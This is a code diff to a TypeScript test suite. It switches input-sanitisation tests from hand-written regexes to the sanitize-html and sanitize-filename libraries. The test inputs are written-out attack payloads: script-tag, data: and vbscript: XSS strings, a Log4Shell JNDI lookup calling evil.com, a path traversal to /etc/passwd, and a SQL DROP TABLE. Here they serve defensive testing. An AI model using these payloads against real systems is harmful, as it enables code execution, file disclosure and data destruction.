@@ -3,6 +3,8 @@
  */
 import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
 import { validateEnvironmentConfiguration } from './config.js';
+import sanitizeHtml from 'sanitize-html';
+import sanitizeFilename from 'sanitize-filename';
 
 describe('Authentication Security Tests', () => {
   let originalEnv: NodeJS.ProcessEnv;
@@ -105,25 +107,39 @@ describe('Authentication Security Tests', () => {
       const maliciousInputs = [
         '<script>alert("xss")</script>',
         'javascript:void(0)',
+        'data:text/html,<script>alert(1)</script>',
+        'vbscript:msgbox("XSS")',
         '${jndi:ldap://evil.com/exp}',
         '../../../etc/passwd',
         'DROP TABLE users;',
       ];
 
       maliciousInputs.forEach(input => {
-        // Simple sanitization check - remove dangerous patterns
-        const sanitized = input
-          .replace(/<[^>]*>/g, '') // Remove HTML tags
-          .replace(/javascript:/gi, '') // Remove javascript: protocol
-          .replace(/\${.*}/g, '') // Remove template injection patterns
-          .replace(/\.\.\//g, '') // Remove path traversal
-          .replace(/DROP|DELETE|INSERT|UPDATE|SELECT/gi, ''); // Remove SQL keywords
+        // Use well-vetted libraries for sanitization
+        let sanitized = sanitizeHtml(input, {
+          allowedTags: [],                       // Remove all HTML tags
+          allowedAttributes: {},                 // Remove all attributes
+          allowedSchemes: [],                    // Remove all protocols like javascript:, vbscript:, data:, etc.
+          parser: { lowerCaseAttributeNames: true, lowerCaseTags: true },
+        });
 
-        expect(sanitized).not.toContain('<script>');
-        expect(sanitized).not.toContain('javascript:');
+        // Sanitize template injection patterns
+        sanitized = sanitized.replace(/\${[^}]*}/g, '');
+
+        // Sanitize SQL injection patterns
+        sanitized = sanitized.replace(/DROP\s+TABLE|DELETE\s+FROM|INSERT\s+INTO|UPDATE\s+SET|SELECT\s+FROM/gi, '');
+
+        // Path traversal: sanitize using sanitize-filename
+        sanitized = sanitizeFilename(sanitized);
+
+        // Additional validation after sanitization
+        expect(sanitized.toLowerCase()).not.toContain('<script');
+        expect(sanitized.toLowerCase()).not.toContain('javascript:');
+        expect(sanitized.toLowerCase()).not.toContain('data:');
+        expect(sanitized.toLowerCase()).not.toContain('vbscript:');
         expect(sanitized).not.toContain('${');
         expect(sanitized).not.toContain('../');
-        expect(sanitized.toLowerCase()).not.toContain('drop table');
+        expect(sanitized.toLowerCase()).not.toMatch(/drop\s+table/);
       });
     });
 
